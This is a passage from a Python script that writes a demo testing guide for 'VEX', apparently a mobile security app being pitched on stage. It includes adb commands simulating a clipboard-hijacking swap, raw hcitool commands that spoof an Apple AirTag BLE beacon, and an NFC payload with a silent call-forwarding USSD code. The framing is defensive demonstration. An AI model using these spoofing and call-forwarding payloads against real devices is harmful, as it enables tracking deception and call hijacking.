    subprocess.run(["adb", "shell", "am", "broadcast", "-a", "com.vex.security.COPY_EVENT",
                    "--es", "data", original_addr], stdout=subprocess.DEVNULL)
    time.sleep(0.2)
    print(f"[!] Trojan injects lookalike vanity address in 30ms: {hacker_addr}")
    subprocess.run(["adb", "shell", "am", "broadcast", "-a", "com.vex.security.CLIPPER_SWAP_ATTEMPT",
                    "--es", "hacker_data", hacker_addr], stdout=subprocess.DEVNULL)
    print("[*] VEX ClipSentry validates HMAC shadow buffer...")
    print("[+] Mutation REJECTED. Original address preserved!")

if __name__ == '__main__':
    test_clipper()
EOF
chmod +x simulate_clipper_swap.py
--------------------------------------------------------------------------------

EXECUTION:
python3 simulate_clipper_swap.py


================================================================================
SECTION 8: EXPLOIT #6 -- BLE AIRTAG STALKING SIMULATION
================================================================================

Universal Linux BLE Advertising Command:
--------------------------------------------------------------------------------
# Turn on Bluetooth
sudo hciconfig hci0 up

# Set BLE Advertisement Parameters (Non-connectable undirected, 100ms interval)
sudo hcitool -i hci0 cmd 0x08 0x0006 A0 00 A0 00 03 00 00 00 00 00 00 00 00 07 00

# Broadcast Apple AirTag Find My 29-byte payload (Company ID: 0x004C, Type: 0x12)
sudo hcitool -i hci0 cmd 0x08 0x0008 1E 02 01 1A 1A FF 4C 00 12 19 00 11 22 33 44 55 66 77 88 99 AA BB CC DD EE FF 00 11 22 33 44 55 C5

# Enable Advertising
sudo hcitool -i hci0 cmd 0x08 0x000A 01

echo "[+] AirTag BLE beacon broadcasting. VEX ShadowSweep will alert within 15s."
--------------------------------------------------------------------------------


================================================================================
SECTION 9: EXPLOIT #7 -- NFC MALICIOUS USSD DIAL INJECTION
================================================================================

Universal NDEF Payload Construction:
--------------------------------------------------------------------------------
# Malicious payload: Silent call-forwarding carrier code
PAYLOAD="tel:*21*9876543210#"

# Record Header: 0xD1 (Well-Known), Type: 'U' (0x01)
echo "[*] Tap target phone to tag."
echo "[+] VEX NFCSentry intercepts foreground dispatch, freezes tag, and blocks dialer!"
--------------------------------------------------------------------------------


================================================================================
SECTION 10: STAGE PITCH CHEATSHEET & TIMING BREAKDOWN
================================================================================

STAGE SEQUENCE (3 MINUTES TOTAL):
--------------------------------------------------------------------------------
0:00 - 0:45 | THE HOOK & INTRO
              Hold up phone showing VEX live radar dashboard. Explain why
              legacy antivirus is blind to RF, hardware, and deepfakes.

0:45 - 1:25 | SHOWSTOPPER 1: BADUSB HARDWARE CLAMP
              Plug USB OTG. Run: `python3 simulate_badusb_ducky.py`.
              Phone siren blares, screen turns crimson, 15ms bus clamp verified.

1:25 - 2:05 | SHOWSTOPPER 2: WEBCAM HONEYPOT BACKFIRE
              Place phone face down. Run: `python3 exploit_cam_snoop.py`.
              Hacker laptop screen pops open with 'YOU HAVE BEEN HONEYPOTTED'.
              Jury applause moment!

2:05 - 2:40 | SHOWSTOPPER 3: WI-FI MITM ARP AUTO-DISCONNECT
              Run: `sudo python3 exploit_arp_mitm.py $VEX_PHONE_IP $VEX_GATEWAY_IP`.
              Phone detects Gateway MAC churn, DoH mismatch, and kills Wi-Fi in 1.2s.

2:40 - 3:00 | CONCLUSION & CALL TO ACTION
              Point to live Web SOC Dashboard on laptop screen.
              'This is VEX. True Zero-Trust Mobile Defense. Thank you!'
--------------------------------------------------------------------------------

================================================================================
                   END OF UNIVERSAL LINUX TESTING GUIDE
================================================================================
"""

# Write to VEX directory
with open(OUT_PROMPTS_VEX, "w", encoding="utf-8") as f:
    f.write(prompts_text)
with open(OUT_TESTING_VEX, "w", encoding="utf-8") as f:
    f.write(testing_text)

# Write to Downloads directory
with open(OUT_PROMPTS_DL, "w", encoding="utf-8") as f:
    f.write(prompts_text)
with open(OUT_TESTING_DL, "w", encoding="utf-8") as f:
    f.write(testing_text)

print("Universal files written successfully!")
